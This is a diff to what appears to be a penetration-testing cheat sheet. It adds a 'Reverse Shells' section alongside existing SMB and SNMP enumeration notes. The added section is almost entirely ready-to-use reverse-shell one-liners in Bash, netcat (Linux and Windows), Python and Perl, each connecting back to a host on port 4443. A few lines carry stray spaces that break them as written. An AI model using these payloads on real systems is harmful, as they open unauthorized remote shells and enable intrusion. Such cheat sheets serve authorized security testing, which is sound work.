@@ -72,6 +72,27 @@ smbclient //MOUNT/share
     SNMP enumeration 
 snmp-check target
 
+
+## Reverse Shells 
+    Bash shell
+bash -i >& /dev/tcp/target/4443 0>&1
+
+
+    Netcat Linux
+nc -e /bin/sh target 4443
+
+
+    Netcat Windows
+nc -e cmd.exe target 4443
+
+    Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_ STREAM);s.connect(("target",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","- i"]);'
+
+
+    Perl
+perl -e 'use Socket;$i="target";$p=4443;socket(S,PF_INET,SOCK_STREAM,getproto byname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN ,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+
 # WEB
 
 >> see all links for faster enum of site content (linkgopher)
